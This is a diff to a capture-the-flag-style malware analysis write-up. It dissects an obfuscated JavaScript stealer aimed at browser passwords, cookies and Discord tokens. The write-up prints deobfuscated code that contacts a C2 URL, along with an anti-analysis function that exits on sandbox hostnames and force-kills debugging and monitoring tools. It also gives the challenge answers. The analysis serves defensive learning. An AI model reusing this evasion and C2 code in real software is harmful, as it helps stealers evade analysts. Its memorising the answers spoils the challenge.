@@ -85,7 +85,7 @@ This took a while, but going through the beautified code, I found a few URLs sit
 At this point I found it way too difficult to debug on the Kali machine. After some searching, multiple sources suggested to open the same file on a Win11 machine, so I did. After running the install scripts for `sqlite3` and `@primno/dpapi` I opened the file in my Windows 11 VM from my homelab. I opened the archive using 7zip.
 
 <p align="left">
-<img width="1280" height="720" alt="Cover" src="win11vm.png" /> 
+<img width="1280" height="720" alt="Cover" src="images/win11vm.png" /> 
 </p>
 
 - Task 7 states that the malware is looking for a particular path to connect back on. What is the full URL used for C2 of this malware?
@@ -93,11 +93,63 @@ At this point I found it way too difficult to debug on the Kali machine. After s
 Now, I decided to debug the file using Visual Studio Code as earlier, and switching to a Win11 Machine proved useful since this app was meant to run on Windows and not Linux. After a few attempts, I managed to catch the de-obfuscated code whilst running and pausing debugger. 
 
 <p align="left">
-<img width="1280" height="720" alt="Cover" src="deobf.png" /> 
+<img width="1280" height="720" alt="Cover" src="images/deobf.png" /> 
 </p>
 
 Now I can see about 900 lines of javaScript. This code is very interesting with multiple malicious functions. I assume these are the functions used to steal user data, as the name implies. The names suggest multiple sources of data such as passwords, cookies, autofills, aimed at Browsers, Firefox and Discord, also with some injection scripts
 
-<p align="left">
-<img width="1280" height="720" alt="Cover" src="funct.png" /> 
+<p align="center">
+<img alt="Cover" src="images/funct.png" /> 
 </p>
+
+In the top of the code, I saw a const named options, with an api: `https://illitmagnetic.site/api/`. I assumed this is the answer to Task 7, since it's connected to the previous domain and is a full URL. After checking it was the correct answer.
+- Task 8 states that the malware has a configured user_id which is sent to the C2 in the headers or body on every request. What is the key or variable name sent which contains the user_id value? 
+
+I decided to check one of the functions and try to look for a user_id, since the task says it's on every request. Here's an example: 
+```
+async function getDiscordTokens() {
+    const request = await fetch(options.api + 'paths', {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json',
+            'duvet_user': options.user_id
+        }
+    });
+  ```
+In the end I can see `'duvet_user'` from `options.user_id`, which is the answer to Task 8
+
+- Task 9 states that the malware checks for a number of hostnames upon execution, and if any are found it will terminate. What hostname is it looking for that begins with arch?
+
+Let's take a look at the `checkvm` function to see if there's a hostname that starts with "arch"
+```
+function checkVm() {
+    if(Math.round(totalmem() / (1024 * 1024 * 1024)) < 2) process.exit(1);
+    if([
+        'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb',
+        'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r',
+        'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj',
+        'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS', 'aranmoo', 'kathlcox', 'rotembarne', 'bilawson', 'seanwalla', 'gugonzal', 'zachwood', 'theresap', 'joyedwar', 'richar', 'dburns', 'willipe'
+    ].includes(hostname().toLowerCase())) process.exit(1);
+
+    const tasks = execSync('tasklist');
+    [
+        'opera', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd',
+        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
+        'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver',
+        'vmwareservice', 'vmwaretray', 'discordtokenprotector'
+    ].forEach((task) => {
+        if(tasks.includes(task))
+        execSync(`taskkill /f /im ${task}.exe`);
+    });
+};
+```
+In this function, we can see that in the first if statement there's a number of hostnames being checked, one of them being `archibaldpc`, which is the answer to Task 9. This is an interesting function, it seems it was made in order to avoid launching the code on certain machines. Some of these names look like default names for analyst and sandbox VM's, so this is a way to evade them. So, I believe this was made in order to stop the code from executing and avoid getting caught. This is another mechanism alongside obfuscation to make sure the malicious software remains hidden.
+
+- Task 10 states that the malware looks for a number of processes when checking if it is running in a VM; however, the malware author has mistakenly made it check for the same process twice. What is the name of this process?
+
+We can observe the earlier function's second part for that. If we look closely, we can see that `vmwaretray` is mentioned twice. Therefore, that is the answer. I should have switched to a Win11 machine earlier!
+
+<p align="center">
+<img alt="Cover" src="images/vmtray.png" /> 
+</p>
+
